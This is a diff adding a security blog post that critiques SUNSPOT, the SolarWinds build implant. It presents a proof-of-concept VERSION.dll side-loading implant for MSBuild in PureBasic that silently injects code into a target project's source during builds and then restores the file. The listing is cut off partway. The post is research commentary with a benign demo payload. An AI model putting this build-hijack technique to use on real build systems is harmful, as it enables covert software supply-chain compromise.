@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8' />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="a12d404 - by marpie : ... about security, reversing and other gimmicks." /><meta name="summary" content="A implementation critique on SUNSPOT, the MSBuild implant of SUNBURST.">
+
+    <link rel="stylesheet" href="/stylesheets/bootstrap.min.css">
+    <link rel="stylesheet" href="/stylesheets/bootstrap-theme.min.css">
+    <link rel="stylesheet" href="/stylesheets/stylesheet.css" media="screen, print">
+    <link rel="stylesheet" href="/stylesheets/highlight.css" media="screen, print">
+
+    <link rel="alternate" type="application/atom+xml" href="/feed.xml" title="a12d404.net - marpie">
+
+    <title>Backdooring MSBuild - marpie (a12d404.net)</title>
+
+    <!-- Twitter cards -->
+    <meta name="twitter:site"        content="@markus_pieton">
+    <meta name="twitter:title"       content="Backdooring MSBuild">
+    <meta name="twitter:description" content="A implementation critique on SUNSPOT, the MSBuild implant of SUNBURST."><meta name="twitter:card"        content="summary_large_image">
+    <meta name="twitter:image"       content="https://www.a12d404.net/images/posts/2021-01-16-msbuild-002.png">
+    <!-- end of Twitter cards -->
+  </head>
+
+  <body>
+    <div id="wrap">
+      <!-- header start -->
+      <div class="row no-print">
+        <nav class="navbar navbar-default navbar-fixed-top" role="navigation">
+          <div class="container">
+            <div class="navbar-header">
+              <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-blog-navbar">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+              </button>
+              <a class="navbar-brand" href="/">Ⓐ①②Ⓓ④⓪④ - by marpie</a>
+            </div>
+
+            <div class="collapse navbar-collapse" id="bs-blog-navbar">
+              <ul class="nav navbar-nav">
+                <li class="dropdown">
+                  <a href="/blog/" class="dropdown-toggle" data-toggle="dropdown">✎&nbsp;Blog <b class="caret"></b></a>
+                  <ul class="dropdown-menu"><li><a href="/ranting/2021/01/17/msbuild-backdoor.html">17 Jan 2021 &raquo; Backdooring MSBuild</a></li><li><a href="/windows/2019/10/30/schedsvc-persist-without-task.html">30 Oct 2019 &raquo; Persistence using Task Scheduler without a Scheduled Task</a></li><li><a href="/windows/2019/01/13/persistance-via-path-directories.html">13 Jan 2019 &raquo; Windows 10 Persistence via PATH directories - CDPSvc</a></li><li><a href="/security/2019/01/07/side-loading-fun-7.html">07 Jan 2019 &raquo; DLL Side-Loading for Fun (and Profit?) - Day 7</a></li><li><a href="/security/2019/01/06/side-loading-fun-5-and-6.html">06 Jan 2019 &raquo; DLL Side-Loading for Fun (and Profit?) - Day 5 & 6</a></li><li class="divider"></li>
+                    <li><a href="/blog/">Archive</a></li>
+                  </ul>
+                </li>
+                <li class="dropdown">
+                  <a href="/vulns/" class="dropdown-toggle" data-toggle="dropdown">🦠&nbsp;Vulns <b class="caret"></b></a>
+                  <ul class="dropdown-menu">
+                    <li><a href="/vulns/archive">&raquo; Other Vulnerabilities</a></li>
+                    <li><a href="/vulns/notes-sl-password-retrieval">&raquo; IBM Lotus Notes Single Logon Password Retrieval</a></li></ul>
+                </li>
+                <li>
+                  <a href="/repos.html">☄&nbsp;Projects</a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+      </div>
+      <!-- header end -->
+
+      <div class="container">
+        <div class="col-xs-12 col-sm-6 col-md-8">
+          <article>
+            <header class="page-header">
+              <h1 itemprop="headline">Backdooring MSBuild</h1>
+              <div class="post-metadata">
+                Posted: <time itemprop="datePublished" datetime="2021-01-17 00:00:00 +0000">17 Jan 2021</time>
+                - Updated: <time itemprop="dateModified" datetime="2021-01-17 18:50:00 +0000">17 Jan 2021</time>
+                - Category: ranting
+                - Tags: backdoor, sunburst, sunspot, rant</div>
+            </header>
+
+            <section>
+              <p>
+  <img style="max-width: 100%; height:auto" src="//www.a12d404.net/images/posts/2021-01-16-msbuild-002.png"/>
+</p><p>In 2020, different United States federal government branches were affected by a
+<a href="https://en.wikipedia.org/wiki/2020_United_States_federal_government_data_breach">massive data breach</a>.
+One part of these efforts was an attack on SolarWinds and their platform,
+including the build-infrastructure of their flagship product, <em>SolarWinds Orion</em>.
+On January 11th, 2021, the CrowdStrike Intelligence Team
+<a href="https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/">published an analysis</a>
+of a malicious tool deployed into SolarWinds’ build environment to inject
+the <em>SUNBURST backdoor</em> into the SolarWinds Orion platform at build-time.</p>
+
+<p>The CrowdStrike blog post was referred to me by a colleague. Initially, I
+thought it was pretty sloppy of the <em>SUNSPOT</em> developers to search for
+<code class="language-plaintext highlighter-rouge">MSBuild.exe</code> processes every second, then read the virtual memory of these
+remote processes to determine if the right solution is being build right now.
+In addition to all this noise, the <em>SUNBURST</em> attackers created a
+<em>Scheduled Task</em> to start the implant on every boot.</p>
+
+<p>If one imagines that you are a top of the line attack boutique and compromised
+different <em>hard targets</em>, including the build-infrasturcture, why do you resort
+to such a crude way to execute that beautiful implanting attack?</p>
+
+<p>So how could one do better?</p>
+
+<h3 id="msbuild-revisited">MSBuild Revisited</h3>
+
+<p>So, <em>MSBuild</em>, the Microsoft engine for building applications, uses (most of the
+time) XML files to steer the targeted solution’s build process.</p>
+
+<p>One of the first things you’ll notice when inspecting the <code class="language-plaintext highlighter-rouge">MSBuild.exe</code> binary 
+is that it is itself a .NET Assembly. So what is the best way to backdoor 
+(almost) any .NET Assembly?</p>
+
+<p>… right, using the <code class="language-plaintext highlighter-rouge">version.dll</code> trick.</p>
+
+<p>After running a quick build of an arbitrary solution (e.g. via
+<code class="language-plaintext highlighter-rouge">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe SomeProject.sln /t:Build /p:Configuration=Release;Platform=Win64</code>)
+and recording a trace with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">ProcMon</a>,
+multiple DLLs are searched in the directory of <code class="language-plaintext highlighter-rouge">MSBuild.exe</code>:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"load-not-found-dll"</span><span class="p">,</span><span class="nl">"event_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">mscoree.dll"</span><span class="p">,</span><span class="nl">"process_image_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">MSBuild.exe"</span><span class="p">}</span><span class="w">
+</span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"load-not-found-dll"</span><span class="p">,</span><span class="nl">"event_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">ole32.dll"</span><span class="p">,</span><span class="nl">"process_image_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">MSBuild.exe"</span><span class="p">}</span><span class="w">
+</span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"load-not-found-dll"</span><span class="p">,</span><span class="nl">"event_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">api-ms-win-core-winrt-l1-1-0.dll"</span><span class="p">,</span><span class="nl">"process_image_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">MSBuild.exe"</span><span class="p">}</span><span class="w">
+</span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"load-not-found-dll"</span><span class="p">,</span><span class="nl">"event_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">VERSION.dll"</span><span class="p">,</span><span class="nl">"process_image_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">MSBuild.exe"</span><span class="p">}</span><span class="w">
+</span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"load-not-found-dll"</span><span class="p">,</span><span class="nl">"event_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">api-ms-win-core-winrt-string-l1-1-0.dll"</span><span class="p">,</span><span class="nl">"process_image_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">MSBuild.exe"</span><span class="p">}</span><span class="w">
+</span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"load-not-found-dll"</span><span class="p">,</span><span class="nl">"event_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">sxs.dll"</span><span class="p">,</span><span class="nl">"process_image_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">MSBuild.exe"</span><span class="p">}</span><span class="w">
+</span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"load-not-found-dll"</span><span class="p">,</span><span class="nl">"event_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">WindowsCodecs.dll"</span><span class="p">,</span><span class="nl">"process_image_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">MSBuild.exe"</span><span class="p">}</span><span class="w">
+
+</span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"load-not-found-dll"</span><span class="p">,</span><span class="nl">"event_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">VERSION.dll"</span><span class="p">,</span><span class="nl">"process_image_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">Csc.exe"</span><span class="p">}</span><span class="w">
+</span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"load-not-found-dll"</span><span class="p">,</span><span class="nl">"event_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">mscoree.dll"</span><span class="p">,</span><span class="nl">"process_image_path"</span><span class="p">:</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Microsoft.NET</span><span class="se">\\</span><span class="s2">Framework64</span><span class="se">\\</span><span class="s2">v4.0.30319</span><span class="se">\\</span><span class="s2">Csc.exe"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Given these results, we can target <code class="language-plaintext highlighter-rouge">MSBuild.exe</code> or the C# compiler (<code class="language-plaintext highlighter-rouge">Csc.exe</code>)
+directly, depending on our preferences and objectives. As CrowdStrike mentioned,
+the implant checked for the right solution being built, so we also will target
+<code class="language-plaintext highlighter-rouge">MSBuild.exe</code> in our tests.</p>
+
+<h3 id="versiondll-structure"><code class="language-plaintext highlighter-rouge">VERSION.dll</code> Structure</h3>
+
+<p>For our purposes, it is enough to know that <code class="language-plaintext highlighter-rouge">VERSION.dll</code> exports 17 names, which
+we need to implement (or forward) to ensure the target’s functionality is
+not impaired.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__export_name</span><span class="p">(</span><span class="n">GetFileVersionInfoA</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">GetFileVersionInfoByHandle</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">GetFileVersionInfoExA</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">GetFileVersionInfoExW</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">GetFileVersionInfoSizeA</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">GetFileVersionInfoSizeExA</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">GetFileVersionInfoSizeExW</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">GetFileVersionInfoSizeW</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">GetFileVersionInfoW</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">VerFindFileA</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">VerFindFileW</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">VerInstallFileA</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">VerInstallFileW</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">VerLanguageNameA</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">VerLanguageNameW</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">VerQueryValueA</span><span class="p">)</span>
+<span class="n">__export_name</span><span class="p">(</span><span class="n">VerQueryValueW</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="proof-of-concept-poc">Proof of Concept (PoC)</h3>
+
+<p>The following section describes a crude PoC that implements the backdoor
+functionality in a DLL without the need for reading remote process memory or
+triggering a process search every second.</p>
+
+<p>The PoC will be written in PureBasic, as no sane attacker will implement his 
+implant in it and copy-pasting of this source is therefore not a concern ;-)</p>
+
+<h4 id="objectives">Objectives</h4>
+
+<p>The implant should have the following characteristics:</p>
+
+<ul>
+  <li>no additional running processes</li>
+  <li>no remote process actions (reading/ writing remote process memory, etc.)</li>
+  <li>only trigger on the right solution being build</li>
+  <li>insertion of the backdoor during the build process</li>
+  <li>removal of the backdoored source file after the build process</li>
+</ul>
+
+<h4 id="implementation">Implementation</h4>
+
+<p>As we saw earlier, the <code class="language-plaintext highlighter-rouge">VERSION.dll</code> file is loaded very early by the .NET
+runtime. By implementing mock-functions, it is possible to verify that the
+DLL is not only loaded, but the function <code class="language-plaintext highlighter-rouge">GetFileVersionInfoSizeW</code> is called
+right before the build process is executed, as shown in the following figure.</p>
+
+<p><img src="/images/posts/2021-01-16-msbuild-001.png" alt="`GetFileVersionInfoSizeW` executed as part of MSBuild." /></p>
+
+<p>Given that, it is possible not to rely on any half-baked solution in the
+<em>DllMain</em> function and get around any problems with the <em>Loader Lock</em> by simply
+hijacking the call <code class="language-plaintext highlighter-rouge">GetFileVersionInfoSizeW</code>, executing our backdoor insertion
+code, then calling the real <code class="language-plaintext highlighter-rouge">GetFileVersionInfoSizeW</code> function and returning its
+result.</p>
+
+<p>In the <em>PoC</em> presented below, the backdoor is inserted in the call to
+<code class="language-plaintext highlighter-rouge">GetFileVersionInfoSizeW</code>. The source is saved in memory, and
+as soon as <em>DllMain</em> is called with <code class="language-plaintext highlighter-rouge">DLL_PROCESS_DETACH</code>, the backdoor-code is
+removed by restoring the previous source code.</p>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>Targeting <em>MSBuild</em> directly by copying our <code class="language-plaintext highlighter-rouge">VERSION.dll</code> to the <em>MSBuild</em>
+directory, ensures better operational security as no additional processes need
+to be created, the memory search can be omitted and every build is captured,
+as our code is directly executed by <em>MSBuild</em>.</p>
+
+<p><img src="/images/posts/2021-01-16-msbuild-002.png" alt="Inserted backdoor code at MSBuild run." /></p>
+
+<h3 id="source">Source</h3>
+
+<p>Source and a compiled binary is available in the <a href="https://github.com/marpie/a12d404.net-files/tree/master/msbuild-backdoor">blog’s Github repo</a>.</p>
+
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">;</span> <span class="o">***************************************************************************</span>
+<span class="err">;</span> <span class="o">*</span>                                                                         <span class="o">*</span>
+<span class="err">;</span> <span class="o">*</span> <span class="n">Author</span><span class="p">:</span>      <span class="n">marpie</span> <span class="p">(</span><span class="n">marpie@a12d404</span><span class="p">.</span><span class="n">net</span><span class="p">)</span>                                <span class="o">*</span>
+<span class="err">;</span> <span class="o">*</span> <span class="n">License</span><span class="p">:</span>     <span class="n">BSD</span> <span class="mi">2</span><span class="o">-</span><span class="n">clause</span>                                               <span class="o">*</span>
+<span class="err">;</span> <span class="o">*</span> <span class="n">Copyright</span><span class="p">:</span>   <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2021</span><span class="p">,</span> <span class="n">a12d404</span><span class="p">.</span><span class="n">net</span>                                      <span class="o">*</span>
+<span class="err">;</span> <span class="o">*</span> <span class="n">Status</span><span class="p">:</span>      <span class="n">Prototype</span>                                                  <span class="o">*</span>
+<span class="err">;</span> <span class="o">*</span> <span class="n">Created</span><span class="p">:</span>     <span class="mi">20200116</span>                                                   <span class="o">*</span>
+<span class="err">;</span> <span class="o">*</span> <span class="n">Last</span> <span class="n">Update</span><span class="p">:</span> <span class="mi">20200117</span>                                                   <span class="o">*</span>
+<span class="err">;</span> <span class="o">*</span>                                                                         <span class="o">*</span>
+<span class="err">;</span> <span class="o">***************************************************************************</span>
+<span class="n">EnableExplicit</span>
+
+<span class="err">;</span> <span class="o">---------------------------------------------------------------------------</span>
+<span class="err">;</span><span class="o">-</span> <span class="n">Consts</span>
+
+<span class="p">#</span><span class="n">TARGET_SOLUTION</span> <span class="o">=</span> <span class="s">"ConsoleApp1.sln"</span>
+<span class="p">#</span><span class="n">BACKDOOR_CODE</span> <span class="o">=</span> <span class="s">"public Class1() { Console.WriteLine("</span> <span class="o">+</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">+</span> <span class="s">"Hello from the Static initializer!"</span> <span class="o">+</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">+</span> <span class="s">"); }"</span>
+<span class="p">#</span><span class="n">BACKDOOR_INSERT_AFTER</span> <span class="o">=</span> <span class="s">"class Class1 {"</span>
+
+<span class="p">#</span><span class="n">BACKDOOR_ALIVE</span> <span class="o">=</span> <span class="err">$</span><span class="n">c45c9bda8db1</span>
+<span class="p">#</span><span class="n">MIN_SIZE</span> <span class="o">=</span> <span class="mi">100</span> <span class="err">;</span> <span class="mi">100</span> <span class="n">bytes</span>
+
+<span class="err">;</span> <span class="o">---------------------------------------------------------------------------</span>
+<span class="err">;</span><span class="o">-</span> <span class="n">Variables</span>
+<span class="k">Global</span> <span class="n">mux</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="p">#</span><span class="n">Null</span>      <span class="err">;</span> <span class="n">set</span> <span class="n">in</span> <span class="n">DLL_PROCESS_ATTACH</span>
+<span class="k">Global</span> <span class="n">hVersion</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="p">#</span><span class="n">Null</span> <span class="err">;</span> <span class="n">orig</span> <span class="n">version</span><span class="p">.</span><span class="n">dll</span> <span class="n">handle</span>
+<span class="k">Global</span> <span class="n">active</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>       <span class="err">;</span> <span class="n">checked</span> <span class="n">in</span> <span class="n">CleanupBackdoor</span>
+
+<span class="k">Global</span> <span class="n">origContent</span><span class="p">.</span><span class="n">s</span> <span class="o">=</span> <span class="s">""</span>   <span class="err">;</span> <span class="n">ptr</span> <span class="n">to</span> <span class="n">memory</span> <span class="n">of</span> <span class="n">the</span> <span class="n">original</span> <span class="n">source</span>
+<span class="k">Global</span> <span class="n">origContentSize</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="err">;</span> <span class="n">size</span> <span class="n">of</span> <span class="n">the</span> <span class="n">original</span> <span class="n">source</span>
+
+<span class="err">;</span> <span class="o">---------------------------------------------------------------------------</span>
+<span class="err">;</span><span class="o">-</span> <span class="n">Backdoor</span> <span class="n">Handling</span>
+
+<span class="n">Procedure</span><span class="p">.</span><span class="n">s</span> <span class="n">GetTargetFilePath</span><span class="p">()</span>
+  <span class="n">Define</span> <span class="n">i</span><span class="p">.</span><span class="n">i</span>
+  <span class="n">Define</span> <span class="n">path</span><span class="p">.</span><span class="n">s</span>
+  <span class="k">For</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="k">To</span> <span class="n">CountProgramParameters</span><span class="p">()</span>
+    <span class="n">path</span> <span class="o">=</span> <span class="n">ProgramParameter</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="k">If</span> <span class="n">CountString</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="p">#</span><span class="n">TARGET_SOLUTION</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
+      <span class="n">ProcedureReturn</span> <span class="n">GetPathPart</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">+</span> <span class="s">"Program.cs"</span>
+    <span class="k">EndIf</span>
+  <span class="k">Next</span>
+  <span class="n">ProcedureReturn</span> <span class="s">""</span>
+<span class="n">EndProcedure</span>
+
+<span class="n">Procedure</span><span class="p">.</span><span class="n">b</span> <span class="n">ReadOrigContent</span><span class="p">(</span><span class="n">hFile</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
+  <span class="n">Define</span> <span class="n">res</span><span class="p">.</span><span class="n">b</span> <span class="o">=</span> <span class="p">#</span><span class="k">False</span>
+  <span class="n">FileSeek</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">#</span><span class="n">PB_Absolute</span><span class="p">)</span>
+  <span class="n">Define</span> <span class="n">size</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="n">Lof</span><span class="p">(</span><span class="n">hFile</span><span class="p">)</span>
+  <span class="n">Define</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="n">AllocateMemory</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+  <span class="k">If</span> <span class="n">ReadData</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="o">*</span><span class="n">mem</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">&lt;&gt;</span> <span class="n">size</span>
+    <span class="n">Goto</span> <span class="n">ReadAllCleanup</span>
+  <span class="k">EndIf</span>
+  <span class="n">origContent</span> <span class="o">=</span> <span class="n">PeekS</span><span class="p">(</span><span class="o">*</span><span class="n">mem</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="p">#</span><span class="n">PB_UTF8</span><span class="p">)</span>
+  <span class="n">origContentSize</span> <span class="o">=</span> <span class="n">Len</span><span class="p">(</span><span class="n">origContent</span><span class="p">)</span>
+  <span class="n">res</span> <span class="o">=</span> <span class="p">#</span><span class="k">True</span>
+<span class="n">ReadAllCleanup</span><span class="p">:</span>
+  <span class="k">If</span> <span class="o">*</span><span class="n">mem</span>
+    <span class="n">FreeMemory</span><span class="p">(</span><span class="o">*</span><span class="n">mem</span><span class="p">)</span>
+  <span class="k">EndIf</span>
+  <span class="n">ProcedureReturn</span> <span class="n">res</span>
+<span class="n">EndProcedure</span>
+
+<span class="err">;</span> <span class="n">InsertBackdoor</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">be</span> <span class="n">called</span> <span class="n">from</span> <span class="n">a</span> <span class="n">function</span> <span class="n">holing</span> <span class="n">mux!</span>
+<span class="n">Procedure</span><span class="p">.</span><span class="n">b</span> <span class="n">InsertBackdoor</span><span class="p">(</span><span class="n">path</span><span class="p">.</span><span class="n">s</span><span class="p">)</span>
+  <span class="n">Define</span> <span class="n">res</span><span class="p">.</span><span class="n">b</span> <span class="o">=</span> <span class="p">#</span><span class="k">False</span>
+  
+  <span class="n">Define</span> <span class="n">hFile</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="n">OpenFile</span><span class="p">(#</span><span class="n">PB_Any</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="p">#</span><span class="n">PB_File_SharedRead</span> <span class="err">|</span> <span class="p">#</span><span class="n">PB_UTF8</span><span class="p">)</span>
+  <span class="k">If</span> <span class="k">Not</span> <span class="n">hFile</span>
+    <span class="n">ProcedureReturn</span> <span class="n">res</span>
+  <span class="k">EndIf</span>
+  
+  <span class="err">;</span> <span class="n">read</span> <span class="n">file</span> <span class="n">content</span>
+  <span class="k">If</span> <span class="k">Not</span> <span class="n">ReadOrigContent</span><span class="p">(</span><span class="n">hFile</span><span class="p">)</span>
+    <span class="n">Goto</span> <span class="n">InsertBackdoorError</span>
+  <span class="k">EndIf</span>
+  
+  <span class="err">;</span> <span class="n">check</span> <span class="n">if</span> <span class="n">the</span> <span class="n">right</span> <span class="n">code</span> <span class="n">is</span> <span class="n">present</span>
+  <span class="n">Define</span> <span class="n">pos</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="n">FindString</span><span class="p">(</span><span class="n">origContent</span><span class="p">,</span> <span class="p">#</span><span class="n">BACKDOOR_INSERT_AFTER</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span>
+  <span class="k">If</span> <span class="n">pos</span> <span class="o">&lt;</span> <span class="mi">0</span>
+    <span class="n">Goto</span> <span class="n">InsertBackdoorError</span>
+  <span class="k">EndIf</span>
+  
+  <span class="err">;</span> <span class="n">revert</span> <span class="n">file</span> <span class="n">to</span> <span class="mi">0</span>
+  <span class="n">FileSeek</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">#</span><span class="n">PB_Absolute</span><span class="p">)</span>
+  <span class="n">TruncateFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">)</span>
+  
+  <span class="err">;</span> <span class="n">write</span> <span class="n">content</span> <span class="n">till</span> <span class="n">start</span> <span class="n">of</span> <span class="n">backdoor</span>
+  <span class="n">Define</span> <span class="n">writeSize</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="n">pos</span><span class="o">+</span><span class="n">Len</span><span class="p">(#</span><span class="n">BACKDOOR_INSERT_AFTER</span><span class="p">)</span>
+  <span class="n">Define</span> <span class="n">sizeLeft</span> <span class="o">=</span> <span class="n">writeSize</span>
+  <span class="k">If</span> <span class="n">WriteString</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">Left</span><span class="p">(</span><span class="n">origContent</span><span class="p">,</span> <span class="n">writeSize</span><span class="p">),</span> <span class="p">#</span><span class="n">PB_UTF8</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="err">;</span> <span class="n">we</span> <span class="n">should</span> <span class="n">add</span> <span class="n">a</span> <span class="n">restore</span> <span class="n">of</span> <span class="n">the</span> <span class="n">original</span> <span class="n">file</span> <span class="n">here</span>
+    <span class="err">;</span> <span class="p">.</span><span class="err">..</span> <span class="n">depending</span> <span class="n">on</span> <span class="n">the</span> <span class="n">write</span> <span class="n">error</span> <span class="p">.</span><span class="err">..</span>
+    <span class="n">Goto</span> <span class="n">InsertBackdoorError</span>
+  <span class="k">EndIf</span>
+  
